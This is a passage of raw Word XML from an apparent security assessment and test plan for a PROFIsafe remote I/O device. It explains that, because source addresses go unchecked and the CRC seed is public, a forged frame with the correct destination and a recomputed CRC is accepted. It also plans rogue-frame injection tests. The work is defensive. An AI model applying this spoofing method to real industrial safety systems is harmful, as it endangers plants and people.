            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId14" w:history="1">
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId15" w:history="1">
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="2539B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D7EA9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lastRenderedPageBreak/>
              <w:t>"Safe zone behind firewall" assumption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11062" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>SRIO-9402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E4429" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (environmental) </w:t>
            </w:r>
            <w:hyperlink r:id="rId16" w:history="1">
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D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32B2BAA6" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>connecting-device-scoped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAF493A" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (device-level, TESTABLE).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Freedom-from-hazard against a connecting device's </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tampering</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>staleness</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a device function: a forged/injected frame with a wrong </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Dest_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or invalid </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CRC</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is rejected, and loss of the legitimate channel triggers </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>watchdog passivation</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → safe state. This must be positively demonstrated. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1898DE29" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (environmental, NOT device-testable — the RQ-001 core gap).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Because </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Source_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is unchecked under Address Type 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, a connecting device presenting a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">forged source but correct </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Dest_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + a valid recomputed CRC</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cannot be rejected on a source basis. The CRC-Seed24/32 is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>standardized, non-secret</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> value in the public GSD, so it is not a cryptographic barrier. The </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>only remaining barrier is the external firewall assumption (SRIO-9402)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — an organizational/environmental control that </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>device-level functional testing cannot close</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; it can only </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>demonstrate the boundary</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (that a correctly-addressed, valid-CRC frame from a rogue device is accepted). </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B8F8530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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion (connecting-device-scoped):</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-001 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Against a connecting device that sends </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>mis-addressed or corrupted</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames, or that </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>disrupts</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the channel, the device </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>withstands the connection safely</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Dest_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + CRC + watchdog → reject/passivate → no hazardous output) — </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 met</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Against a connecting device that presents a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>forged source with valid addressing + CRC</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, authenticity </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot be enforced on the device</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Source_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> unchecked); freedom-from-hazard rests on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firewall assumption</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2, environmental</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Generalized flooding-DoS = RQ-010; unauthenticated DCP-reset = RQ-011.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF5686B" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="1F80FB54">
          <v:rect id="_x0000_i1353" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B38C83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>Step 2 — Methodological Test Planning (Scope-Corrected)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549"/>
        <w:gridCol w:w="2371"/>
        <w:gridCol w:w="2499"/>
        <w:gridCol w:w="621"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="0EF615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226DE8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DF41D6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ED7F71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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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3EDD94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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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C75434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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="2C9A0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AE2054" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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AF05C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Baseline </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> exchange with correct </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; verify qualifier = good, outputs follow control byte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3DBF5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>Functional implementation of CR 3.1 in normal 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9F402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t>Requirements-based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verification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2DECD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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="58A5E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55434" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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C0F2E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Enumerate what a </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>connecting device reaches</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> on the DUT (services/ports on the non-safety path) vs. the approved matrix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F2BB5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Attack-surface a connected device sees → </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>evidence for G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (firewall-assumption reliance)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C89FB" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">NIST SP 800-115 §4.2/4.3; ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-001</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Nmap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D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64A1D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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="534BF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9DF07" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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DFDD6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Rogue-device frame injection: (a) wrong </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, (b) bit-</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">flipped CRC/payload, (c) correct </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + valid recomputed CRC, forged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FE2F8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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Effectiveness of CRC + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> verification (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>a,b</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">); </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">demonstrates </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>boundary of G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (c)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310F8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lastRenderedPageBreak/>
              <w:t xml:space="preserve">MITRE ATT&amp;CK for ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0856</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Spoof Reporting Message</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0836</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Modify Parameter</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0855</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Unauthorized Command Message</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; NIST SP 800-115 §5.2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EE1DE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lastRenderedPageBreak/>
              <w:t>SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="36BCF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D3623" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
